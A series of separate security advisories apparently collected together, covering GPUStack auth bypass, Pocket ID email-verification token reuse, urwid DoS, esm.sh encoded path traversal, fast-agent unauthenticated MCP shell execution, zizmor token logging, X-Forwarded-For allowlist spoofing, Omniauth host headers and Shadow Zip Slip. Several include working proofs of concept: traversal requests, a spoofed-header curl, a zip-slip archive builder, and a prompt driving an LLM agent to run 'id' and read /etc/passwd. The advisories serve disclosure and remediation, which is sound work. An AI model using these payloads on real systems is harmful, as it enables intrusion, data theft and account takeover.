Either path yields **full, unauthenticated administrative access** over the network: enumerate and modify users, models, workers, and configuration; mint persistent admin API keys (scope `["*"]`, valid from any source IP thereafter); read worker credentials and cloud/provider secrets. Combined with admin-only functionality such as `POST /v2/inference-backends/from yaml`, this leads to code execution on worker hosts.

This vulnerability has been observed exploited in the wild against a v2.1.1 deployment (attacker-created custom backends running reverse shells).

### Root cause

Trusting the network source of a request (socket peer, or a client-controllable header) as an authentication signal. When GPUStack is fronted by a same-host reverse proxy, the socket peer is always loopback, so the "localhost is trusted" assumption no longer holds.

### Patches

Fixed in `gpustack` `2.2.0`: the loopback auto-admin path was removed and client-IP / forwarding-header handling was hardened. Upgrade to `2.2.0` or later.

### Workarounds

- Set `force_auth_localhost=true` to require authentication even for loopback
  requests.
- Ensure the reverse proxy / gateway cannot cause GPUStack to treat external
  traffic as loopback, and strip any client-supplied `X-GPUStack-Real-IP`
  header at the edge.
- Keep the API off untrusted networks (VPN / edge authentication).

### Remediation (in the fix)

Do not derive authentication from the request's network source. Remove implicit loopback-based admin, and only accept a real client-IP header from an authenticated/trusted gateway (never from arbitrary clients).

### Credit

Independently reported by Nikko Enggaliano; Wei Yunzhou; and Rui Yang & Haoyu Wang (Johns Hopkins University). Active in the-wild exploitation was reported by Javier Sixto (ulex.fr).

## Summary

An authenticated Pocket ID user can request an email-verification token while their account uses an address they control, change the account email address, and then redeem the previously issued token. The token is bound only to the user ID, not to the address to which it was sent, and changing the address does not revoke outstanding tokens.

As a result, Pocket ID marks the newly supplied address as verified even though the user never proved control of it. Pocket ID subsequently returns that address with `email_verified: true` in OIDC claims. A relying party that trusts this claim for email-based account linking or provisioning can therefore link the attacker's Pocket ID identity to a victim's existing account, leading to cross-application account takeover.

This was verified against commit `9f559788a44cfea790de360da0a74d4bdf8ca5d5`.

## Preconditions

- The attacker has an ordinary Pocket ID user account.
- Email verification is in use (`emailsVerified=false`, which is the default).
- The user can edit their own account (`allowOwnAccountEdit=true`, which is the default).
- The target address is not already assigned to another Pocket ID user.
- For downstream account takeover, a relying party links or provisions users based on a trusted, verified email address. Applications that rely exclusively on the stable OIDC `sub` claim are not affected by that downstream consequence.

No administrator privilege, victim interaction, or access to the victim's mailbox is required.

## Reproduction through the API

1. Sign in as an ordinary user whose current email address is controlled by the attacker, for example `attacker@example.test`.
2. Call `POST /api/users/me/send-email-verification`.
3. Obtain the token from the message delivered to `attacker@example.test`, but do not redeem it yet.
4. Call `PUT /api/users/me` and change the account email to an address the attacker does not control, for example `victim@example.test`.
5. Observe that the new address is initially stored with `emailVerified: false`.
6. Call `POST /api/users/me/verify-email` with the token delivered to `attacker@example.test`.
7. Call `GET /api/users/me`. The current address is now `victim@example.test` and `emailVerified` is `true`.
8. Complete an OIDC flow with the `email` scope. Pocket ID emits:

```json
{
  "email": "victim@example.test",
  "email_verified": true
}
```

The old token has therefore verified a different address from the one to which it was delivered.

## Executable regression test / proof of concept

Save this as `backend/internal/service/audit_email_verification_test.go` and run:

```text
go test -tags=exclude_frontend,unit ./internal/service -run TestAuditEmailVerificationTokenSurvivesEmailChange -count=1 -v
```

The test passes on the referenced commit and demonstrates the unintended state transition:

```go
package service

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/pocket-id/pocket-id/backend/internal/appconfig"
	"github.com/pocket-id/pocket-id/backend/internal/dto"
	"github.com/pocket-id/pocket-id/backend/internal/model"
	datatype "github.com/pocket-id/pocket-id/backend/internal/model/types"
)

func TestAuditEmailVerificationTokenSurvivesEmailChange(t *testing.T) {
	userService, _ := newTestUserService(t)
	config := &appconfig.AppConfigModel{
		RequireUserEmail:    "true",
		AllowOwnAccountEdit: "true",
		EmailsVerified:      "false",
	}

	attackerEmail := "attacker-controlled@example.test"
	user, err := userService.CreateUser(t.Context(), config, dto.UserCreateDto{
		Username:      "attacker",
		Email:         &attackerEmail,
		EmailVerified: false,
	})
	require.NoError(t, err)

	const tokenFromAttackerMailbox = "token-issued-for-attacker-email"
	require.NoError(t, userService.db.Create(&model.EmailVerificationToken{
		UserID:    user.ID,
		Token:     tokenFromAttackerMailbox,
		ExpiresAt: datatype.DateTime(time.Now().Add(time.Hour)),
	}).Error)

	victimEmail := "victim@example.test"
	_, err = userService.UpdateUser(t.Context(), config, user.ID, dto.UserCreateDto{
		Username: user.Username,
		Email:    &victimEmail,
	}, true, false)
	require.NoError(t, err)

	changed, err := userService.GetUser(t.Context(), user.ID)
	require.NoError(t, err)
	require.Equal(t, victimEmail, *changed.Email)
	require.False(t, changed.EmailVerified)

	require.NoError(t, userService.VerifyEmail(
		t.Context(),
		user.ID,
		tokenFromAttackerMailbox,
	))

	verified, err := userService.GetUser(t.Context(), user.ID)
	require.NoError(t, err)
	require.Equal(t, victimEmail, *verified.Email)
	require.True(t, verified.EmailVerified)
}
```

Observed result:

```text
=== RUN   TestAuditEmailVerificationTokenSurvivesEmailChange
PASS: TestAuditEmailVerificationTokenSurvivesEmailChange
PASS
```

## Root cause

`backend/internal/model/email_verification_token.go` stores only a token, expiration, and user ID. It does not store or cryptographically bind the address being verified.

`UserService.SendEmailVerification` creates the token for `user.ID` and sends it to the current `user.Email`, but that email is not part of the token record:

```go
emailVerificationToken := &model.EmailVerificationToken{
	UserID:    user.ID,
	Token:     randomToken,
	ExpiresAt: datatype.DateTime(expiration),
}
```

`UserService.UpdateUser` resets the verification flag when the address changes but leaves existing verification tokens valid.

`UserService.VerifyEmail` validates only the token, user ID, and expiry, then sets `EmailVerified` on the user's current record:

```go
err := tx.WithContext(ctx).Where(
	"token = ? AND user_id = ? AND expires_at > ?",
	token,
	userID,
	datatype.DateTime(time.Now()),
).First(&emailVerificationToken).Error

user, err := s.getUserInternal(ctx, emailVerificationToken.UserID, tx)
// ...
user.EmailVerified = true
```

Finally, `backend/internal/oidc/claims_service.go` publishes the current address and flag together:

```go
claims["email"] = *user.Email
claims["email_verified"] = user.EmailVerified
```

## Impact

The direct impact is an authentication-integrity failure in an identity provider: any ordinary user can cause Pocket ID to attest control of an arbitrary unused email address.

The security boundary crossed by that false attestation is the relying application. Where a relying party treats `email_verified=true` as proof of address ownership and uses email for automatic account matching, the attacker can be signed into or linked to the victim's existing relying-party account. This can expose all data and actions available through that account.

## Suggested remediation

1. Store a normalized target email address (or a keyed hash of it) with every verification token.
2. During redemption, atomically require that the stored target address still equals the user's current normalized email address.
3. Invalidate all outstanding email-verification tokens whenever the account email changes.
4. Invalidate prior outstanding tokens when issuing a replacement token.
5. Add a regression test that changes the email after issuance and requires the old token to be rejected.

## Testing note

Source review and test construction were AI-assisted. The finding, affected control flow, preconditions, and executable proof of concept were validated against the referenced Pocket ID commit before submission.

### Summary
The `handle_short_request()` function in `urwid/display/web.py` raises an unhandled `UnicodeEncodeError` when processing a POST request body containing non-ASCII bytes. The function reads POST input and encodes it to ASCII before writing to a named pipe. Any byte value above `0x7F` causes the CGI process to exit with an unhandled exception, returning an HTTP 500 error to the client. Additionally, a file descriptor opened earlier in the same function is not closed before the exception propagates, causing a file descriptor leak for the lifetime of the CGI process.

A second instance of missing exception handling exists in the polling update path, where non-UTF-8 socket output causes an unhandled `UnicodeDecodeError`.

### Impact
An attacker who observes a valid `X-Urwid-ID` session token (transmitted in plaintext HTTP response headers) can send repeated POST requests containing non-ASCII bytes to the `urwid` CGI endpoint. Each malformed request causes the CGI handler to crash with HTTP 500. This results in a Denial of Service (DoS) for legitimate users using the `urwid` web interface.

### Affected Versions
`urwid <= 4.0.6`

### Patches
Fixed in `urwid 4.0.7`. Users should upgrade to version `4.0.7` or later.

### Workarounds
No direct workaround exists short of disabling the `urwid` web display interface.

### Summary The documented `web.NewHandler` static file server can read files outside `Config.AppDir` when the request path contains URL-encoded dot-segments such as `%2e%2e`. Go's `ServeMux` redirects plain `/../` paths, but it passes encoded dot-segments to the handler after decoding `r.URL.Path`. The handler then calls `filepath.Join(s.config.AppDir, r.URL.Path)` without checking that the result remains under `AppDir`, allowing unauthenticated arbitrary file reads with the server process privileges. ### Details `web/README.md:34-40` documents a network-facing setup: ```go http.Handle("GET /", web.NewHandler(web.Config{ AppDir: "/path/to/webapp", Fallback: "/index.html", Dev: false, })) log.Fatal(http.ListenAndServe(":8080", nil)) ``` In `web/handler.go:62-75`, the handler takes `r.URL.Path` and joins it directly with `s.config.AppDir`: ```go pathname := r.URL.Path filename := filepath.Join(s.config.AppDir, pathname) fi, err := os.Lstat(filename) ``` Later the same resolved filename is opened and copied to the response in `web/handler.go:150-166` for non-HTML/static files. There is no `filepath.IsLocal`, cleaned-relative-path, absolute-root prefix, or symlink-aware containment check before opening the file. A plain `/../secret.txt` path is redirected by Go's `ServeMux`, but an encoded path such as `/%2e%2e/secret.txt` is decoded into `r.URL.Path == "/../secret.txt"` and reaches the handler. On Linux, `filepath.Join("/tmp/root/app", "/../secret.txt")` resolves to `/tmp/root/secret.txt`, outside the configured app directory. Source-to-sink chain: ```text Unauthenticated HTTP request path containing URL-encoded dot-segments -> net/http decodes path into r.URL.Path -> documented ServeMux setup passes encoded dot-segment path to web.NewHandler -> web/handler.go joins Config.AppDir with r.URL.Path -> os.Lstat/os.Open operate on the escaped path -> io.Copy returns file contents to the attacker ``` False-positive checks performed: - Plain dot-segment paths are redirected by `http.ServeMux`, but encoded dot-segments are not blocked and reach the handler. - The PoC uses the documented `http.Handle("GET /", web.NewHandler(...))` setup, not a custom bypass of ServeMux. - A control request for `/secret.txt` does not read the outside file; the disclosure requires encoded traversal segments. - The issue is independent of `Dev`/HMR; it reproduces with `Dev: false`. - The root cause appears in other handler paths that join app paths, but the static file read path is sufficient to prove arbitrary file disclosure. Candidate score: 18/18 under the local audit scoring rubric. The handler is documented for network-facing use, the attacker directly controls the request path, the path reaches `os.Open`, file disclosure was reproduced locally, and no root containment mitigation is present. ### PoC This safe local proof creates an application directory and a sibling secret file outside it, registers the handler exactly as documented, and requests the sibling file through encoded `..` path segments. ```go package main import ( "fmt" "net/http" "net/http/httptest" "os" "strings" "github.com/esm-dev/esm.sh/web" ) func main() { mux := http.NewServeMux() mux.Handle("GET /", web.NewHandler(web.Config{AppDir: os.Args[1], Dev: false})) for _, target := range []string{ "http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt", "http://example/secret.txt", } { rr := httptest.NewRecorder() req := httptest.NewRequest("GET", target, nil) mux.ServeHTTP(rr, req) fmt.Printf("%s => status=%d location=%q contains_secret=%v body=%q\n", target, rr.Code, rr.Header().Get("Location"), strings.Contains(rr.Body.String(), "ancestor-secret-marker"), rr.Body.String(), ) } } ``` Maintainer-runnable clean-checkout recipe: ```sh tmp=$(mktemp -d) mkdir -p "$tmp/root/a/b/app" printf 'ancestor-secret-marker' > "$tmp/root/secret.txt" printf '

inside

' > "$tmp/root/a/b/app/index.html" cat > "$tmp/poc.go" <<'EOF' [place the PoC above here] EOF go run "$tmp/poc.go" "$tmp/root/a/b/app" rm -rf "$tmp" ``` Observed vulnerable output in this environment: ```text http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker" http://example/secret.txt => status=200 location="" contains_secret=false body="

inside

" ``` Final re-check after drafting reproduced the same output: ```text http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker" http://example/secret.txt => status=200 location="" contains_secret=false body="

inside

" ``` Additional parser/control evidence observed locally: ```text http://example/../secret.txt => status=307 loc="/secret.txt" handler Path="/../secret.txt" RawPath="/%2e%2e/secret.txt" http://example/%2e%2e/secret.txt => status=204 loc="" http://example/a/../../secret.txt => status=307 loc="/secret.txt" ``` This confirms that the documented `ServeMux` setup redirects plain traversal paths but lets encoded dot-segments reach the handler. ### Impact An unauthenticated remote attacker can read files that are outside the configured web application directory but readable by the server process. Depending on deployment layout and process privileges, this can disclose source files, configuration files, environment-adjacent files, build artifacts, local credentials, private keys, or other application secrets located in ancestor or sibling directories. The impact is limited to file disclosure in the confirmed path. No write primitive or code execution was confirmed in this audit. ### Suggested remediation Normalize request paths into a cleaned relative path before joining them with `AppDir`, and reject any path that is not local. A robust pattern is: - reject paths containing NUL bytes, - use `path.Clean("/" + r.URL.EscapedPath())` or an equivalent URL-path canonicalization step, - trim the leading slash and reject non-local paths with `filepath.IsLocal`, - join only the validated relative path to `AppDir`, - optionally compare absolute cleaned paths to ensure the result remains inside the absolute app root, - consider symlink policy explicitly if symlinks inside `AppDir` should not escape the app root. Add regression tests for `/%2e%2e/secret.txt`, multi-level encoded traversal, plain `/../` behavior, and normal in-app file serving. ### Credits - Thai Son Dinh from VinSOC Labs (R&D)

## Summary
`fast-agent serve` exposes the agent over MCP. By default it uses HTTP transport bound to `0.0.0.0` (all interfaces) on port 8000 with **no authentication** (`auth=None`) and prints no warning. Any host that can reach the port can call the exposed `agent` tool. When the server is started with `--shell` (which is `-x`, the flag used in the README quickstart `uvx fast-agent mcp@latest -x`), the agent has a local `execute` shell tool, so an unauthenticated remote client can drive the agent into running arbitrary OS commands — unauthenticated RCE.

## Affected code
- `cli/commands/serve.py` — transport defaults to HTTP; `--host` defaults to `0.0.0.0`; port 8000.
- `mcp/server/agent_server.py` — `auth_provider = None` unless `FAST_AGENT_SERVE_OAUTH=huggingface`;
  `run_async(transport="http", host=host, ...)` with `host` defaulting to `0.0.0.0`.
- `tools/local_shell_executor.py` — the shell tool runs commands via `create_subprocess_shell`.

## Verified (live, faithful — published 0.7.20 in Docker python:3.13-slim, stock unauthenticated client)
1) Unauthenticated exposure (core defect): a client with no Authorization header completed
   `initialize` and `tools/list` (-> `['agent']`) against `http://HOST:8000/mcp`. Model-independent.
2) Unauthenticated RCE with `--shell`, demonstrated two ways:
   - Real production model (`gpt-4o-mini`): a single plain-language message asking the agent to run
     a command via its shell tool -> the model autonomously called `execute` and the command output
     (process identity showing it ran as root, the hostname, and the first lines of a sensitive
     system file) was returned to the unauthenticated caller.
   - Key-free deterministic (`passthrough` model): the tool-call directive invoked the shell tool
     directly, same result.
   The server-side permission prompt did not block this in non-interactive serve mode.

## Proof of concept
Environment: Docker `python:3.13-slim`, `pip install fast-agent-mcp` -> 0.7.20.

```
# server (real model + the documented shell flag; 0.0.0.0 is also the built-in default)
OPENAI_API_KEY=*** fast-agent serve --model gpt-4o-mini --shell --host 0.0.0.0 --port 8000
#  -> "Uvicorn running on http://0.0.0.0:8000"   (no auth, no warning)

# attacker: unauthenticated MCP HTTP client (NO Authorization header) to http://HOST:8000/mcp
#   initialize()                       -> 200 OK (server fast-agent-MCP-Server 0.7.20)
#   tools/list                         -> ['agent']
#   tools/call name="agent" arguments={"message":
#       "Using your execute/shell tool, run exactly this command and return its raw stdout: "
#       "id; echo PWNED=$(hostname); cat /etc/passwd | head -2"}
#
# response returned to the UNAUTHENTICATED caller:
#   uid=0(root) gid=0(root) groups=0(root)
#   PWNED=<host>
#   <first lines of /etc/passwd>
```
Also reproduced key-free with `--model passthrough` and the message `***CALL_TOOL execute {"command":"id"}` (passthrough invokes the tool deterministically). Full transcript + client scripts were sent by email.

## Impact
An unauthenticated client that can reach the serve port controls the agent: with `--shell` this is remote command execution as the server user; without `--shell` it is unauthenticated use of the operator's LLM and any configured MCP servers' tools. The `0.0.0.0` default makes the server reachable beyond localhost as soon as it runs on a non-isolated host. Preconditions (serve + shell) are noted above and are why I defer the exact rating to you.

## Remediation
1. Default the bind host to `127.0.0.1`; require an explicit `--host 0.0.0.0` opt-in for non-loopback.
2. Print a loud warning when binding a non-loopback interface without authentication.

### Summary

zizmor 1.27.0 exposes GitHub access tokens in cleartext when debug-level logging is enabled. Tokens supplied via environment variables (`GH_TOKEN`, `GITHUB_TOKEN`, `ZIZMOR_GITHUB_TOKEN`), or the corresponding command-line options (`--gh-token`, `--github-token`, `--zizmor-github-token`) are included in the debug representation of the parsed application configuration and written to stderr.

The affected logging is enabled by a single `-v`/`--verbose` or an applicable `RUST_LOG` directive. 

### Details

The issue was introduced in commit [919bea46](https://github.com/zizmorcore/zizmor/commit/919bea4635bae204d5186e5743cb263c70b518b4), merged through [PR #2180](https://github.com/zizmorcore/zizmor/pull/2180). Version `1.26.1` and earlier are unaffected. Version `1.27.0` is the first and only affected release.

zizmor accepts GitHub credentials to perform authenticated GitHub API requests for the purposes of retrieving remote GitHub repositories and performing online audits that may require resolving information such as action references, commits, or repository metadata. A GitHub credential is used to avoid unauthenticated API limits and, when applicable, provide access to private repositories.

PR #2180 was intended to improve the experience around zizmor’s implicit offline mode. It also moved the CLI types into a dedicated module and added a debug log of the fully parsed `App` value:

```rust
tracing::debug!("app: {app:?}");
```

 This diagnostic is useful for understanding the effective CLI state, including whether offline operation was explicit or inferred. However, the same commit added derived `Debug` implementations to `App`, `NetworkArgs`, and `GitHubToken(String)`.
Before the debug event is emitted, the compatibility token aliases are merged into `app.network.gh_token`.

The resulting stderr contains the token verbatim. Explicit `--offline` clears the token before the debug event, but normal online operation and `--no-online-audits` retain it.

### PoC

Using `zizmor` at `v1.27.0`:

`GH_TOKEN=gho_ZIZMOR_MRE zizmor --verbose example.yml`

will emit

```text
DEBUG zizmor: app: App { input: InputArgs { inputs: ["example.yml"], collect: [Default], strict_collection: false }, audit: AuditArgs { fix: None, pedantic: false, persona: Regular, min_severity: None, min_confidence: None, no_ignores: false }, output: OutputArgs { verbose: Verbosity { verbose: 1, quiet: 0, phantom: PhantomData<clap_verbosity_flag::InfoLevel> }, format: Plain, no_progress: false, color: None, render_links: Auto, show_audit_urls: Auto, no_exit_codes: false, naches: false }, network: NetworkArgs { offline: false, gh_token: Some(GitHubToken("gho_ZIZMOR_MRE")), github_token: None, zizmor_github_token: None, gh_hostname: Standard("github.com"), no_online_audits: false, cache_dir: "/Users/shaan/.cache/zizmor" }, args: GlobalArgs { lsp: LspArgs { lsp: false, stdio: false }, config: None, no_config: false, completions: None, thanks: false, help: (), version: () } }
```

### Impact

In practice, the impact of this vulnerability should be mediated by GitHub's own layered defenses, including secret redaction in Actions logs and automatic credential revocation in issue/PR/etc. comments. However, zizmor itself should never log sensitive materials, and so the behavior is still considered vulnerable even if compensating controls exist in downstream systems.

An affected user must enable debug logging while supplying a GitHub credential, and the resulting stderr must be available to another party. Plausible disclosure channels include a public bug report, CI log or artifact, or terminal capture. A potential attacker only needs permission to read the disclosed logs.

The resulting impact depends on the token's scopes, repository access, and lifetime. A minimally scoped token may only expose public read-only data, while a broader OAuth token or personal access token may permit private-repository or modification of repositories, packages, workflows, or organization resources. The default informational logging level is unaffected. Exploitation requires debug logging and subsequent log exposure, which limits likelihood.

Notably, because `zizmor`’s bug-report template asks users to rerun commands with `--verbose` and paste the complete logs, this can result in credentials being copied into public issues or other support channels.

### Summary
A remote attacker from any IP address defeats the operator-configured source-IP allowlist (`mcp_allowed_remote_ips` / `api_token_allowed_remote_ips`) by sending a single `X-Forwarded-For: <allowlisted-ip>` header. The router is created with `gin.New()` and never calls `SetTrustedProxies`, so gin trusts every proxy by default and `c.ClientIP()` returns the attacker-supplied header verbatim. The same forged value is also written to `Transaction.CreatedIp` and the access log, so the attacker's real IP never appears in any record.

### Details
`cmd/webserver.go:104` builds the router with `gin.New()`. A grep of `cmd/` and `pkg/` confirms `SetTrustedProxies` is never called, leaving gin's default trusted-proxy range of `0.0.0.0/0` and `::/0`. `WebContext` (`pkg/core/context_web.go:39`) embeds `*gin.Context` and does not override `ClientIP()`.

Both allowlist middlewares match the operator allowlist against this attacker-controlled value:

```go
// pkg/middlewares/mcp_server_ip_limit.go:19
if config.MCPAllowedRemoteIPs[i].Match(c.ClientIP()) { c.Next(); return }
```

The identical `c.ClientIP()` is consumed by the audit trail at `pkg/api/transactions.go:1078` (`createNewTransactionModel(..., c.ClientIP())` → `CreatedIp`) and the access log (`pkg/middlewares/request_log.go:28`), so one header both bypasses the gate and forges attribution.

### PoC
Runtime PoC (no live deployment required) — `pkg/middlewares/xff_bypass_runtime_test.go`, `pkg/middlewares/xff_chain_runtime_test.go`:

```
go test ./pkg/middlewares/ -run 'TestACCESSCONTROL001_XFFBypass|TestCHAIN_AllowlistBypass' -v
```

Output:
```
[control] no XFF, RemoteAddr=1.2.3.4 -> status=400 (correctly blocked)
[exploit] XFF=10.0.0.1, RemoteAddr=1.2.3.4 -> status=200, ClientIP=10.0.0.1 (bypassed)
gate status = 200 | created_ip that would be persisted = "10.0.0.1"
```

Against a live instance with `mcp_allowed_remote_ips=10.0.0.1`:
```
curl -s -o /dev/null -w "%{http_code}\n" https://target/mcp            # 403 (blocked)
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 10.0.0.1" https://target/mcp  # passes IP gate
```

### Impact
Defeats an explicitly advertised, operator-configured security control on the MCP and API-token surfaces, from any source IP, with a single header and no authentication to the gate itself. It also destroys non-repudiation: every action is logged under the spoofed allowlisted IP, so audit trails point at the trusted host instead of the attacker. (The MCP/API actions themselves still require a valid token — this neutralizes the compensating IP control, not the JWT layer.)

### Impact
Host header injection risk when using Omniauth with a web framework that does not verify incoming host headers. An example of a framework that provides host header validation is modern Rails when [configured appropriately](https://guides.rubyonrails.org/v6.1.1/configuring.html#configuring-middleware)

### Patches
2.2.0

### Workarounds
_Set the `full_host` config in the Omniauth config_

### Summary
ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. `../../../../tmp/pwned.txt`) in entry names will have those entries reproduced verbatim in the output shadow JAR.

### Details
The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
2. The produced shadow JAR becomes a Zip Slip weapon against any 
downstream consumer using unprotected extraction (raw ZipInputStream, 
older CI tooling, custom Java unpackers)
3. If Shadow ever uses a non-ZipFileTree code path, protection 
disappears silently

Affected file: `src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt`

### PoC
1. Create a malicious JAR with path traversal entry:
```python
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
```
2. Add as dependency in a shadow project
3. Run `gradle shadowJar`
4. Run `unzip -l build/libs/*.jar | grep "\.\."`
5. Traversal entry survives in output JAR

### Impact
Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions  are directly vulnerable at build time.
